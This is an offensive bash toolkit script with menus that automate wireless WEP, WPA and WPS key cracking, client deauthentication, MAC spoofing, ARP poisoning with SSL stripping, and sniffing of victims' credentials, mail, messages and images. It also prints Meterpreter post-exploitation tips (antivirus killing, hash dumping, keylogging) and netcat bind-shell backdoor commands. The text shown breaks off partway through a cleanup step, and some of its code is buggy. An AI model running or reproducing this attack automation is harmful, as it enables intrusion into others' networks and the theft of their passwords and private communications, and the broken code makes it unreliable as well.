#!/bin/bash

# Time Elapsed Functions
timelapsed () {

	k=1
	until [ -e $home/pio.txt ]; do
		sleep 1
		if [ $k -lt 10 ]; then
			echo -en  "[$k s]\b\b\b\b\b\c"
		elif [ $k -ge 10 ]; then
			echo -en  "[$k s]\b\b\b\b\b\b\c"
		elif [ $k -ge 100 ]; then
			echo -en  "[$k s]\b\b\b\b\b\b\b\c"
		elif [ $k -ge 1000 ]; then
			echo -en  "[$k s]\b\b\b\b\b\b\b\b\c"
		elif [ $k -ge 10000 ]; then
			echo -en  "[$k s]\b\b\b\b\b\b\b\b\b\c"
		else [ $k -ge 100000 ]
			echo -en  "[$k s]\b\b\b\b\b\b\b\b\b\b\c"
		fi
		k=$[ $k + 1 ]
	done
	# use:
	# echo -n "what i am doing "
	# timelapsed &
	# operation ...
	# time_stop

}

time_stop () {

	touch $home/pio.txt
	sleep 1
	rm -f $home/pio.txt
	echo ""

}


##################################################################################

# Programs Functions

##################################################################################

f_metasploit () {

f_meterpreter () {

f_art
echo "#######################################################"
echo "[*] Meterpreter"
echo "#######################################################"

echo ""

echo "help ----------------> will show a list of possible commands"
echo "use priv  |  help ---> will show two hidden commands"

echo ""

echo "Hide Yourself in an Existing Process: "
echo "1) ps --------------> show the running process and theirs ID"
echo "2) migrate ID -------------> hide you in a running process, use"
echo "                             some that is not going to be"
echo "                             closed by the user, it can fail"
echo "3) find antivirus and stop them with KILL ID(Antivirus ID)"

echo ""

echo "Information Gathering : "
echo "getuid -------> show all the logged users"
echo "idletime ---------> show the time that the user has been inactive"
echo "sysinfo -----------> show the computer name, architecture and language"
echo "hashdump ------------> dump the SAM file with the user's hashes"

echo "Uictl Enable/Disable : "
echo "uictl enable/disable keyboard  -------> enable/disable the keyboard"
echo "uictl enable/disable mouse  ----------> enable/disable the mouse"

echo "shell ----------------------------> run command on the victim's system"


echo "SCRIPTS : "
echo "list ------------> bash: cd /opt/metasploit/msf3/scripts/meterpreter && ls *"
echo "help ------------> help nomescript"
echo "run scripts --------> run nomescript"
echo "  [*] run winenum   ---------> script to acquire tonns of usefull information , logged in /root/.msf3"
echo "  [*] run killav    ---------> script to kill all the antivirus"
echo "                               that he can manage to"
echo "  [*] run gettelnet -u USER -p PASSWORD --------------> create a telnet account to witch you can log on"
echo "  [*] run keylogrecorder ------------------> log all the key pressed to /root/.msf3/logs/keylogrecorder"

}

f_meterpreter

}

f_netcat () {

# http://joncraton.org/files/nc111nt.zip
# BackDoor
echo "victim (until connection ends): nc -l -p PORT -vv -e cmd.exe"
echo "       (permanent, last forever) : nc -L -p PORT -vv -e cmd.exe"
echo "attacker : nc VictimIP PORT -vv"

}


f_interface_monitor_down () {

	echo "[*] Putting Up $interface, Disabiliting Monitor Mode And Ripristinating MAC ..."
	ifconfig $interface_monitor down 1> /dev/null 2> /dev/null
	ifconfig $interface down 1> /dev/null 2> /dev/null
	airmon-ng stop $interface_monitor 1> /dev/null 2> /dev/null
	airmon-ng stop $interface 1> /dev/null 2> /dev/null
	ifconfig $interface up 1> /dev/null 2> /dev/null
	macchanger --mac $originalmac $interface 1> /dev/null 2> /dev/null

}

f_interface_monitor_up () { # interface | fakemac


	echo "[*] Stopping $interface ... "
	airmon-ng stop $interface 1> /dev/null 2> /dev/null
	ifconfig $interface down 1> /dev/null 2> /dev/null

	echo "[*] Changing MAC to $fakemac ... "
	originalmac=$( ifconfig $interface | grep "HWaddr" | tr ' ' '\012' | sort -u | head -n 2 | tail -n 1 )
	macchanger --mac $fakemac $interface 1> /dev/null 2> /dev/null

	echo "[*] Starting $interface ... "
	airmon-ng start $interface 1> /dev/null 2> /dev/null
	interface_monitor=$( iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' )

}

f_charset () {

	carsetcho=0
	alpha=1
	ALPHA=2
	alpha_ALPHA=3
	numeric=4
	alpha_numeric=5
	ALPHA_numeric=6
	alpha_ALPHA_numeric=7
	symbol=8
	alpha_symbol=9
	ALPHA_symbol=10
	numeric_symbol=11
	alpha_ALPHA_symbol=12
	alpha_numeric_symbol=13
	ALPHA_numeric_symbol=14
	alpha_ALPHA_numeric_symbol=15
	custom=16
	menu=17
	until [ $charsetcho == $alpha ] || [ $charsetcho == $ALPHA ] || [ $charsetcho == $alpha_ALPHA ] || [ $charsetcho == $numeric ] || [ $charsetcho == $alpha_numeric ] || [ $charsetcho == $ALPHA_numeric ] || [ $charsetcho == $alpha_ALPHA_numeric ] || [ $charsetcho == $symbol ] || [ $charsetcho == $alpha_symbol ] || [ $charsetcho == $ALPHA_symbol ] || [ $charsetcho == $numeric_symbol ] || [ $charsetcho == $alpha_ALPHA_symbol ] || [ $charsetcho == $alpha_numeric_symbol ] || [ $charsetcho == $ALPHA_numeric_symbol ] || [ $charsetcho == $alpha_ALPHA_numeric_symbol ] || [ $charsetcho == $custom ] || [ $charsetcho == $menu ]; do
			f_art
		echo "[*] Charset Selection :"
		echo ""
		echo "1)  [a...z]"
		echo "2)  [A...Z]"
		echo "3)  [a...z][A...Z]"
		echo "4)  [0...9]"
		echo "5)  [a...z][0...9]"
		echo "6)  [A...Z][0...9]"
		echo "7)  [a...z][A...Z][0...9]"
		echo "8)  [punct]"
		echo "9)  [a...z][punct]"
		echo "10) [A...Z][punct]"
		echo "11) [0...9][punct]"
		echo "12) [a...z][A...Z][punct]"
		echo "13) [a...z][0...9][punct]"
		echo "14) [A...Z][0...9][punct]"
		echo "15) [a...z][A...Z][0...9][punct]"
		echo "16) Custom Charset"
		echo "17) Main Menu"
		echo ""
		echo -n "Choice : "
		read charsetcho
	done

	case $charsetcho in

	1) charset="abcdefghijklmnopqrstuvwxyz" ;;

	2) charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" ;;

	3) charset="ABCDEFGHIJKLMNOPQRSTUVWXYZ" ;;

	4) charset="1234567890" ;;

	5) charset="abcdefghijklmnopqrstuvwxyz1234567890" ;;

	6) charset="ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890" ;;

	7) charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890" ;;

	8) charset="\|!£$%&/()='?^[]{}+-*@#§.,;:<>" ;;

	9) charset="abcdefghijklmnopqrstuvwxyz\|!£$%&/()='?^[]{}+-*@#§.,;:<>" ;;

	10) charset="ABCDEFGHIJKLMNOPQRSTUVWXYZ\|!£$%&/()='?^[]{}+-*@#§.,;:<>" ;;

	11) charset="1234567890\|!£$%&/()='?^[]{}+-*@#§.,;:<>" ;;

	12) charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\|!£$%&/()='?^[]{}+-*@#§.,;:<>" ;;

	13) charset="abcdefghijklmnopqrstuvwxyz1234567890\|!£$%&/()='?^[]{}+-*@#§.,;:<>" ;;

	14) charset="ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\|!£$%&/()='?^[]{}+-*@#§.,;:<>" ;;

	15) charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\|!£$%&/()='?^[]{}+-*@#§.,;:<>" ;;

	16) echo ""
		echo ""
		echo -n "Input Your Charset : "
		read charset
		;;

	17) f_return_to_menu ;;

	esac

}

f_return_to_menu () {

	sleep 2
	echo ""
	echo ""
	echo "[*] Now Returning To The Main Menu ..."
	sleep 3
	f_menu

}

##################################################################################

# Scripts Functions

##################################################################################

f_wireless () {

	f_wireless_wep_passcrack () {

		f_art

		echo -n "Write the interface that you wanna use (es : wlan0 ) : "
		read interface

		echo -n "Write the fake MAC that you wanna use (es : 00:11:22:33:44:55 ) : "
		read fakemac

		f_interface_monitor_up

		f_art
		echo "[*] Now it Will be started Airodump-ng on $interface_monitor,"
		echo "    where you can find information about the Wireless Network"
		sleep 3
		( xterm -geometry 75x25+700+40 -T "Airodump-NG" -e airodump-ng $interface_monitor ) &

		f_art
		echo -n "Write the bssid of the network (es : 00:19:A1:11:AV:45 ) : "
		read bssid

		echo -n "Write the Essid Name (es : WiFiNetwork ) : "
		read essid

		f_art
		echo -n "Calculating The Key ... "
		timelapsed &
		wesside-ng -i $interface -a $fakemac -v $bssid >> $HOME/wepkey2.txt
		cat $HOME/wepkey2.txt | grep "KEY=(" | awk '{print $2}' | sed -e 's/KEY=(//' | sed -e 's/)//' | sed -e 's/://g' | sort -u >> wepkey.txt
		rm -f wepkey2.txt
		wepkey=$(cat wepkey.txt )

		touch $HOME/pio.txt
		sleep 1
		rm -f $HOME/pio.txt
		echo ""

		f_interface_monitor_down

		f_art

		echo "The Password Of The Essid $essid is : $wepkey"
		echo "Wich Is Saved In $HOME/wepkey.txt"

		echo ""
		echo ""
		echo -n "Press Any Key To Go Back To The Main Menu : "
		read key
		f_return_to_menu

	}

	f_wireless_wpa_passcrack () {

		f_pyrit_attackdb () {

			f_art
			echo "[*] Attacking the WpaKey With The Pyrit Database ..."
			pyrit -e $essid -r $cap_path/$cap_name-01.cap attack_db

			echo ""
			echo ""
			echo -n "Press Any key To Go Back To The Main Menu : "
			read key

			f_art
			f_interface_monitor_down

			echo "[*] Deletting $cap_name-01.cap ..."
			rm -f $cap_path/$cap_name-01.cap 1> /dev/null 2> /dev/null

			f_art

			f_return_to_menu
		}

		f_pyrit_generate_db () {

			f_art
			echo "[*] Generating An Entry In The Pyrit Database For $essid ..."
			pyrit -e $essid create_essid 1>  /dev/null 2> /dev/null
			pyrit batch

			echo ""
			echo ""
			echo -n "Press Any key To Go Back To The Main Menu : "
			read key

			f_art
			f_interface_monitor_down

			f_return_to_menu

		}

		f_pyrit_generate_attack_db () {

			f_art
			echo "[*] Generating An Entry In The Pyrit Database For $essid ... "
			timelapsed &
			pyrit -e $essid create_essid 1>  /dev/null 2> /dev/null
			echo -n "[*] Processing The Database... "
			timelapsed &
			pyrit batch 1> /dev/null 2> /dev/null
			echo "[*] Attacking the WpaKey With The Pyrit Database ... "
			pyrit -e $essid -r $cap_path/$cap_name-01.cap attack_db

			touch $HOME/pio.txt 1> /dev/null 2> /dev/null
			sleep 1
			rm -f $HOME/pio.txt 1> /dev/null 2> /dev/null
			echo ""

			echo ""
			echo "Copy the password to a file ... "

			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key

			f_art
			f_interface_monitor_down

			echo "[*] Deletting $cap_name-01.cap ..."
			rm -f $cap_path/$cap_name-01.cap 1> /dev/null 2> /dev/null

			f_art

			f_return_to_menu
		}

		f_pyrit_attack_passthrough () {

			f_art
			echo -n "Enter The Wordlist Path (es : /home/user/worslist.txt ) : "
			read wordlist

			f_art
			echo "[*] Attacking the WpaKey With Pyrit ..."
			roxterm -e echo pyrit -e $essid -i $wordlist -r $cap_path/$cap_name-01.cap attack_passthrough

			echo ""
			echo "Copy the password to a file ... "

			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key

			f_art
			f_interface_monitor_down

			f_art

			f_return_to_menu

		}

		f_aircrack_attack () {

			f_art
			echo -n "Enter The Wordlist Path (es : /home/user/worslist.txt ) : "
			read wordlist

			clear
			echo -n "Enter The Output File For The Password (es: /home/user/wpapass.txt ) : "
			read filetmp

			f_art
			echo "[*] Attacking the WpaKey With Aircrack-NG ..."
			aircrack-ng -e $essid -w $wordlist -b $bssid -l $filetmp $cap_path/$cap_name-01.cap

			f_art

			cat filetmp

			echo ""
			echo ""
			echo -n "Press Any Key To Go Back To The Main Menu : "
			read key

			f_art

			f_interface_monitor_down

			f_return_to_menu

		}

		f_art

		wireless_wpa_cho=0
		sniff=1
		decrypt=2
		sniff_decrypt=3
		
		until [ $wireless_wpa_cho == $sniff ] || [ $wireless_wpa_cho == $decrypt ] || [ $wireless_wpa_cho == $sniff_decrypt ]; do
			f_art
			echo "Select The Action To Perform :"
			echo ""
			echo "1) Sniff A Wpa To Obtain A Crypted Handshake"
			echo "2) Decrypt A Crypted Handshake"
			echo "3) Sniff And Decrypt A Wpa"
			echo ""
			echo -n "Choice : "
			read wireless_wpa_cho
		done
		
		if [ $wireless_wpa_cho == $sniff ] || [ $wireless_wpa_cho == $sniff_decrypt ]; then
			
			echo -n "Enter the Interface To Use (es: wlan0) : "
			read interface

			echo -n "Write the fake MAC that you wanna use (es : 00:11:22:33:44:55 ) : "
			read fakemac

			f_interface_monitor_up

			f_art
			echo "[*] Now it Will be started Airodump-ng on $interface_monitor,"
			echo "    where you can find information about the Wireless Network"
			sleep 7
			( xterm -geometry 75x25+700+40 -T "Airodump-NG" -e airodump-ng $interface_monitor ) &

			f_art
			echo -n "Write the channel of the network (es : 11 ) : "
			read channel

			echo -n "Write the bssid of the network (es : 00:19:A1:11:AV:45 ) : "
			read bssid

			echo -n "Write the Essid Name (es : WiFiNetwork ) : "
			read essid
	
			echo -n "Write The Client MAC (es : 00:19:A1:11:AV:45 ) : "
			read maclient
	
			echo -n "Select the output cap file path (es : /home/user/cap ) : "
			read cap_path

			echo -n "Enter The Cap File Name(es lancap ) : "
			read cap_name

			killall airodump-ng
			killall xterm
	
			( xterm -geometry 75x25+700+40 -T "Airodump-NG" -e airodump-ng -c $channel -w $cap_path/$cap_name.airdump --bssid $bssid $interface_monitor ) &


			f_deauth () {
				k=0
				until [ -e $HOME/go.txt ]; do
					k=$[ $k + 1 ]
					( xterm -geometry 75x25+700+40 -T "Aireplay-NG ($k)" -e aireplay-ng --deauth 0 ­-a $bssid ­-c $maclient $interface ) &
					sleep 15
				done	

			}

			( f_deauth ) &

			a=1
			cont=0
			until [ $a == $cont ]; do
				f_art
				echo -n "Press 1 when you receive the WPA HandShake : "
				read cont
			done	

			( touch $HOME/go.txt 1> /dev/null 2> /dev/null ; sleep 10 ; rm -f $HOME/go.txt 1> /dev/null 2> /dev/null ) &
			
			if [ ! -e $cap_path/$cap_name.airdump ]; then
				echo "Error: Dump File Disappeared !!!!"
				f_interface_monitor_down
				exit 1
			fi
			
			pyrit -r $cap_path/$cap_name.airdump -o $cap_path/$cap_name strip
			
			if [ ! -e $cap_path/$cap_name ]; then
				mv $cap_path/$cap_name.airdump $cap_path/$cap_name
			fi
			
			if [ ! -e $cap_path/$cap_name ]; then
				rm -f $cap_path/$cap_name.airdump
			fi
									
		fi
		
		if [ $wireless_wpa_cho == $decrypt ] || [ $wireless_wpa_cho == $sniff_decrypt ]; then
		
			if [ $wireless_wpa_cho == $decrypt ]; then
				f_art
				echo -n "Select the output cap file path (es : /home/user/cap ) : "
				read cap_path

				echo -n "Enter The Cap File Name(es lancap ) : "
				read cap_name
			fi
			
			pyritcho=100
			pyritattackdb=1
			pyritgeneratedb=2
			pyritgenerateattackdb=3
			pyritattack=4
			aircrackattack=5
			previousmenu=6
			mainmenu=7
			until [ $pyritcho == $pyritattackdb ] || [ $pyritcho == $pyritgeneratedb ] || [ $pyritcho == $pyritgenerateattackdb ] || [ $pyritcho == $pyritattack ] || [ $pyritcho == $aircrackattack ] || [ $pyritcho == $previousmenu ] || [ $pyritcho == $mainmenu ]; do
				f_art
				echo "Select What you wanna do : "
				echo ""
				echo "1) Attack The WpaKey With A Precalculated Database"
				echo "2) Create An Entry In The Database For The Essid And Process It"
				echo "3) Create an Entry In the Database For The Essid, Process It And Find The WpaKey"
				echo "4) Attack The WpaKey Directly With Pyrit"
				echo "5) Attack The WpaKey Directly With Aircrack-NG"
				echo "6) Previous Menu"
				echo "7) Main Menu"
				echo ""
				echo -n "Choice : "
				read pyritcho
			done	

			case $pyritcho in

			1) f_pyrit_attackdb  ;;
	
			2) f_pyrit_generate_db  ;;

			3) f_pyrit_generate_attack_db ;;

			4) f_pyrit_attack_passthrough  ;;

			5) f_aircrack_attack ;;

			6) 	f_interface_monitor_down
				f_wireless
				;;

			7)  f_interface_monitor_down
				f_menu
				;;
	
			esac

		fi
		
	}

	f_wireless_wpa_wpscrack () {

		f_art
		echo -n "Write the interface that you wanna use (es : wlan0 ) : "
		read interface

		echo -n "Write the fake MAC that you wanna use (es : 00:11:22:33:44:55 ) : "
		read fakemac

		f_interface_monitor_up

		interface_monitor=$( iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' )

		f_art
		echo "[*] Now it Will be started Airodump-ng on $interface_monitor,"
		echo "    where you can find information about the Wireless Network"
		sleep 5
		( xterm -geometry 75x25+700+40 -T "Airodump-NG" -e airodump-ng $interface_monitor ) &

		f_art
		echo -n "Write the bssid of the network (es : 00:19:A1:11:AV:45 ) : "
		read bssid

		echo -n "Write the channel of the network (es : 11 ) : "
		read channel

		f_art
		echo "Now Running Reaver, To Bruteforce The WPS Pin ..."
		echo ""
		reaver --interface=$interface_monitor --bssid=$bssid --channel=$channel -vv

		echo ""
		echo ""
		echo -n "Press Any key To Go Back To The Main Menu : "
		read key

		f_art

		f_interface_monitor_down

		f_art

		f_return_to_menu

	}

	f_wireless_decrypt () {

		encryption=0
		wep=1
		wpa=2
		until [ $encryption == $uncrypted ] || [ $encryption == $wep ] || [ $encryption == $wpa ]; do
			f_art
			echo "Encryption Protocol Selection : "
			echo ""
			echo "1) Wep Encryption"
			echo "2) Wpa/Wpa2 Encryption"
			echo "3) Return to the Previous Menu"
			echo ""
			echo -n "Choice : "
			read encryption
		done

		if [ $encryption != $wep ] || [ $encryption != $wpa ]; then
			f_wireless
		fi

		if [ $wirelesscho != "98" ]; then
			echo "Insert The Path Of The .cap file"
			if [ $encryption == $wpa ]; then
				echo "(with the four way handshake if wpa/wpa2)"
			fi
			echo -n "es: /home/user : "
			read cap_path

			echo "Insert The Name Of The .cap file"
			if [ $encryption == $wpa ]; then
				echo "(with the four way handshake if wpa/wpa2)"
			fi
			echo -n "es: wlan-01.cap : "
			read cap_name
		else
			cap_path=$( cat $HOME/cap_path.tmp )
			cap_name=$( cat $HOME/cap_name.tmp )
			rm -f $HOME/cap_path.tmp
			rm -f $HOME/cap_name.tmp
		fi

		echo -n "Insert The Wireless Key : "
		read passkey

		if [ $encryption == $wep ]; then
			f_art
			airdecap-ng -e $essid -w $passkey $cap_path/$cap_name
		fi
		if [ $encryption == $wpa ]; then
			f_art
			airdecap-ng -e $essid -p $passkey $cap_path/$cap_name
		fi


		cap_name=$( echo $cap_name | sed -e 's/.cap/-dec.cap/' )

		f_art
		echo "Your Decrypted Cap File Is In $cap_path/$cap_name !!!"

		if [ $wirelesscho == $decrypt ]; then
			f_return_to_menu
		else
			echo ""
			echo ""
			echo -n "Press Any key To Go Back To The Main Menu : "
			read key
			rm -f decrypted_fin.txt.tmp
			touch decrypted_fin.txt.tmp
			echo "1" > decrypted_fin.txt.tmp
			f_return_to_menu
		fi

	}

	f_wireless_arp () {

		f_wireless_arp_analise_dec () {

			f_art
			echo "Insert The Path Of The .cap file"
			echo -n "es: /home/user : "
			read cap_path
			echo ""
			echo "Insert The Name Of The .cap file"
			echo -n "es: wlan-01.cap : "
			read cap_name

			echo -n "Enter A Dir For Log File (es /home/user/lanlog ) : "
			read logdir
			if [ ! -e $logdir ]; then
				mkdir -p $logdir
			fi

			f_art

			echo "[*] Driftnet (Images Sniffing) ..."
			mkdir -p $logdir/driftnet
			driftnet -f $cap_path/$cap_name -a -d $logdir/driftnet -m 100000 -s 1> /dev/null 2> /dev/null

			echo "[*] Dsniff ..."
			dsniff -f $cap_path/$cap_name -w $logdir/dsniff.txt 1> /dev/null 2> /dev/null

			echo "[*] Filesnarf ..."
			mkdir -p $logdir/filesnarf
			cd $logdir/filesnarf
			filesnarf -p $cap_path/$cap_name 1> /dev/null 2> /dev/null
			cd ..

			echo "[*] Mailsnarf ..."
			mailsnarf -p $cap_path/$cap_name  >> $logdir/mailsnarf.txt 2> /dev/null

			echo "[*] Msgsnarf ..."
			msgsnarf -p $cap_path/$cap_name  >> $logdir/msgsnarf.txt 2> /dev/null

			echo "[*] Urlsnarf ..."
			urlsnarf -p $cap_path/$cap_name  >> $logdir/urlsnarf.txt 2> /dev/null

			echo "Done !!!!"
			echo ""
			echo ""
			echo -n "Press Any key To Go Back To The Main Menu : "
			read key

			f_return_to_menu

		}

		f_wireless_arp_analise_crypt () {

			f_art

			( xterm -geometry 75x25+700+40 -T "Cap Decryption" -e f_wireless_decrypt ) &

			tmp_file=decrypted_fin.txt.tmp
			rm -f $tmp_file

			until [ -e $tmp_file ]; do
				sleep 1
			done

			f_wireless_arp_analise_dec

		}

		f_wireless_arp_create_crypt () {

			f_art

			echo "Insert The Path Of The .cap file"
			echo -n "es: /home/user : "
			read cap_path
			echo ""
			echo "Insert The Name Of The .cap file"
			echo -n "es: wlan-01.cap : "
			read cap_name

			echo -n "Write the interface that you wanna use (es : wlan0 ) : "
			read interface

			echo -n "Write the fake MAC that you wanna use (es : 00:11:22:33:44:55 ) : "
			read fakemac

			f_interface_monitor_up

			interface_monitor=$( iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' )

			f_art
			echo "[*] Now it Will be started Airodump-ng on $interface_monitor,"
			echo "    where you can find information about the Wireless Network"
			sleep 5
			( xterm -geometry 75x25+700+40 -T "Airodump-NG" -e airodump-ng $interface_monitor ) &

			f_art
			echo -n "Write the channel of the network (es : 11 ) : "
			read channel

			echo -n "Write the bssid of the network (es : 00:19:A1:11:AV:45 ) : "
			read bssid

			echo -n "Write The Client MAC (es : 00:19:A1:11:AV:45 ) : "
			read maclient

			echo -n "Write the Essid Name (es : WiFiNetwork ) : "
			read essid

			f_art
			echo "[*] Now it Will be Generated $cap-01.cap"
			( xterm -geometry 75x25+700+40 -T "Airodump-NG" -e airodump-ng -c $channel -w $cap_path/$cap_name --bssid $bssid $interface_monitor ) &

			a=1
			cont=0
			until [ $a == $cont ]; do
				f_art
				echo ""
				echo -n "Press 1 when you want to stop the sniffing : "
				read cont
			done

			f_interface_monitor_down

			f_art
			echo "The Cap File Was Generated In : $cap_path/$cap_name-01.cap"

			sleep 15

			if [ $cho == "3" ]; then
				echo ""
				echo ""
				echo -n "Press Any key To Go Back To The Main Menu : "
				read key
			else
				rm -f $HOME/cap_path.tmp
				rm -f $HOME/cap_name.tmp
				echo "$cap_path" >> $HOME/cap_path.tmp
				echo "$cap_name-01.cap" >> $HOME/cap_name.tmp
			fi

		}

		f_wireless_arp_create_dec () {

			f_art
			f_wireless_arp_create_crypt

			wirelesscho=98
			decrypt=98

			f_wireless_decrypt

		}

		cap_dec=1
		cap_crypt=2
		cap_noexist_crypt=3
		cap_noexist_dec=4
		previousmenu=5
		cho=0
		until [ $cho == $cap_dec ] || [ $cho == $cap_crypt ] || [ $cho == $cap_noexist_crypt ] || [ $cho == $cap_noexist_dec ] || [ $cho == $previousmenu ]; do
			f_art
			echo "Select An Option : "
			echo ""
			echo "1) Analise An Existing Decrypted Cap File"
			echo "2) Analise An Existing Crypted Cap File"
			echo "3) Create A Crypted Cap File"
			echo "4) Create A  Decrypted Cap File"
			echo "5) Return To The Previous Menu"
			echo ""
			echo -n "Choice : "
			read cho
		done

		case $cho in

		1) f_wireless_arp_analise_dec ;;

		2) f_wireless_arp_analise_crypt ;;

		3) f_wireless_arp_create_crypt ;;

		4) f_wireless_arp_create_dec ;;

		5) f_wireless ;;

		esac

	}

wirelesscho=10
wep=1
wpa=2
wps=3
decrypt=4
wireless_arp=5
mainmenu=6
until [ $wirelesscho == $wep ] || [ $wirelesscho == $wpa ] || [ $wirelesscho == $wps ] || [ $wirelesscho == $decrypt ] || [ $wirelesscho == $wireless_arp ] || [ $wirelesscho == $mainmenu ]; do
	clear
	f_art
	echo "#############################################"
	echo ""
	echo "Selection"
	echo ""
	echo "1) Wep Encryption To Break"
	echo "2) Wpa/Wpa2 Encryption To Break"
	echo "3) WiFi Protected Setup (WPS) Crack"
	echo "4) Wireless Cap Decryption"
	echo "5) Wireless Arp Poisoning"
	echo "6) Return to the Main Menu"
	echo ""
	echo -n "Choice : "
	read wirelesscho
done

case $wirelesscho in

1) f_wireless_wep_passcrack ;;

2) f_wireless_wpa_passcrack ;;

3) f_wireless_wpa_wpscrack ;;

4) f_wireless_decrypt ;;

5) f_wireless_arp ;;

6) f_menu ;;

esac

}

f_lanattack () {

	f_lanattack_alive_host () {

		f_art

		if [ $lancho == $alivehost ]; then
			echo -n "Enter The Interface : "
			read interface
		fi
		
		f_art
		
		echo "[*] Launching Netdiscover, to identify Host ..."

		if [ -e "/netdiscover.txt" ]; then
			mv /netdiscover.txt /netdiscover.txt.tmp.back
		fi

		if [ -e "/netdiscover.sh" ]; then
			mv /netdiscover.sh /netdiscover.sh.tmp.back
		fi

		pkill netdiscover 1> /dev/null 2> /dev/null
		( netdiscover -p -P -L -i $interface >> /netdiscover.txt 2> /dev/null ) &

		echo "#!/bin/bash" >> /netdiscover.sh
		echo "file=/goes.txt.back.tack.pap"  >> /netdiscover.sh
		echo "until [ ! -e pepfile ]; do" | sed -e 's/pep/$/g' >> /netdiscover.sh
		echo "	clear" >> /netdiscover.sh
		echo "	cat netdiscover.txt | sort -u | awk '{print pep1}'" | sed -e 's/pep/$/g' >> /netdiscover.sh
		echo "	sleep 5" >> /netdiscover.sh
		echo "done" >> /netdiscover.sh
		chmod 777 /netdiscover.sh

		( xterm -hold -geometry 75x25+700+40 -T " IP List " -e bash /netdiscover.sh ) &

		echo ""
		echo ""
		echo -n "Press Any Key When You Wanna To Stop : "
		read key
		
		killall netdiscover
		
		touch /goes.txt.back.tack.pap
		sleep 5
		rm -f /netdiscover.txt
		if [ -e "/netdiscover.txt.tmp.back" ]; then
			mv /netdiscover.txt.tmp.back /netdiscover.txt
		fi
		rm -f /netdiscover.sh
		if [ -e "/netdiscover.sh" ]; then
			mv /netdiscover.sh.tmp.back /netdiscover.sh
		fi
		
		rm -f touch /goes.txt.back.tack.pap

		f_art

		f_return_to_menu

	}

	f_lanattack_arp_attack () {

		f_art

		echo "1" > /proc/sys/net/ipv4/ip_forward

		echo -n "Enter The Interface : "
		read interface

		echo "[*] Launching Netdiscover, to identify Host ..."

		if [ -e "/netdiscover.txt" ]; then
			mv /netdiscover.txt /netdiscover.txt.tmp.back
		fi

		if [ -e "/netdiscover.sh" ]; then
			mv /netdiscover.sh /netdiscover.sh.tmp.back
		fi

		pkill netdiscover 1> /dev/null 2> /dev/null
		( netdiscover -p -P -L -i $interface >> /netdiscover.txt 2> /dev/null ) &

		echo "#!/bin/bash" >> /netdiscover.sh
		echo "file=/goes.txt.back.tack.pap"  >> /netdiscover.sh
		echo "until [ ! -e pepfile ]; do" | sed -e 's/pep/$/g' >> /netdiscover.sh
		echo "	clear" >> /netdiscover.sh
		echo "	cat netdiscover.txt | sort -u | awk '{print pep1}'" | sed -e 's/pep/$/g' >> /netdiscover.sh
		echo "	sleep 5" >> /netdiscover.sh
		echo "done" >> /netdiscover.sh
		chmod 777 /netdiscover.sh

		( xterm -hold -geometry 75x25+700+40 -T " IP List " -e bash /netdiscover.sh ) &

		echo ""
		echo ""
		echo -n "Press Any Key When You Wanna To Stop : "
		read key
		
		killall netdiscover
		
		touch /goes.txt.back.tack.pap
		sleep 5
		rm -f /netdiscover.txt
		if [ -e "/netdiscover.txt.tmp.back" ]; then
			mv /netdiscover.txt.tmp.back /netdiscover.txt
		fi
		rm -f /netdiscover.sh
		if [ -e "/netdiscover.sh" ]; then
			mv /netdiscover.sh.tmp.back /netdiscover.sh
		fi
		
		rm -f touch /goes.txt.back.tack.pap

		f_art

		echo -n "Enter Gateway Ip (empty to arp all net): "
		read gatewayip

		echo -n "Enter Victim Ip (empty to attack all pc's, but very slow) : "
		read victimip

		echo -n "Enter A Dir For Log File (es /home/user/lanlog ) : "
		read logdir

		echo -n "Enter The Pcap File Name(es lan.pcap ) : "
		read pcapfile

		f_art

		echo "[*] Launching Arp Poisonig Attack (Ettercap) ..."
		echo "1" > /proc/sys/net/ipv4/ip_forward
		( ettercap -i $interface -T -q -w $logdir/$pcapfile -M arp /$gatewayip/ /$victimip/ 1> /dev/null 2> /dev/null ) &
		#( arpspoof -i $interface -t $gatewayip $victimip 1> /dev/null 2> /dev/null ) &
		#sleep 4
		#( arpspoof -i $interface -t $victimip $gatewayip 1> /dev/null 2> /dev/null ) &
		#sleep 4

		echo "[*] Launching SslStrip ..."
		iptables -t Nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000 1> /dev/null 2> /dev/null
		( ssltrip -l 10000 -a -w $logdir/sslstrip.txt 1> /dev/null 2> /dev/null )

		echo "[*] Launching Driftnet (Images Sniffing) ..."
		mkdir -p $logdir/driftnet
		( driftnet -i $interface -a -d $logdir/driftnet -m 100000 1> /dev/null 2> /dev/null ) &

		echo "[*] Launching Dsniff ..."
		( dsniff -i $interface -w $logdir/dsniff.txt 1> /dev/null 2> /dev/null ) &

		echo "[*] Launching Filesnarf ..."
		mkdir -p $logdir/filesnarf
		( cd $logdir/filesnarf ; filesnarf -i $interface 1> /dev/null 2> /dev/null ) &

		echo "[*] Launching Mailsnarf ..."
		( mailsnarf -i $interface  >> $logdir/mailsnarf.txt 2> /dev/null ) &

		echo "[*] Launching Msgsnarf ..."
		( msgsnarf -i $interface  >> $logdir/msgsnarf.txt 2> /dev/null ) &

		echo "[*] Launching Urlsnarf"
		( urlsnarf -i $interface  >> $logdir/urlsnarf.txt 2> /dev/null ) &

		sleep 5

		echo ""
		echo ""
		echo -n "Press Any Key To Stop And Go Back To The Main Menu : "
		read key

		f_art

		echo "[*] Killing Porcesses ..."
		( pkill ettercap 1> /dev/null 2> /dev/null ) &
		( pkill sslstrip 1> /dev/null 2> /dev/null ) &
		( pkill driftnet 1> /dev/null 2> /dev/null ) &
		( pkill dsniff 1> /dev/null 2> /dev/null ) &
		( pkill filesnarf 1> /dev/null 2> /dev/null ) &
		( pkill mailsnarf 1> /dev/null 2> /dev/null ) &
